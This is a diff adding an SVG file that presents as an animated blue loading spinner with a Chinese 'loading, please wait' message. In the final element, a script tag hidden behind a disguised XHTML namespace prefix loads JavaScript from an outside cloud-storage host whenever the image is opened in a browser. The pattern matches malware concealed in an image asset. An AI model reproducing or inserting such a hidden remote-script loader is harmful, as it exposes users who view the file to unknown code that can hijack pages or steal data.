@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50" viewBox="0 0 200 50">
+    <circle cx="50" cy="25" r="20" fill="none" stroke="#007bff" stroke-width="4" transform="translate(70)">
+        <animate attributeName="stroke-dasharray" from="0 125.66370614359172" to="125.66370614359172 0" dur="1s" repeatCount="indefinite" />
+        <animate attributeName="stroke-dashoffset" from="0" to="125.66370614359172" dur="1s" repeatCount="indefinite" /></circle>
+    <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-size="14px" fill="#007bff" id="msg">xxxx加载中，请耐心等待3</text>
+    <something:script src="//bosjs9821.gz.bcebos.com/jstv_jquery_3.js?v=version" xmlns:something="http://www.w3.org/1999/xhtml"></something:script>
+
+</svg>
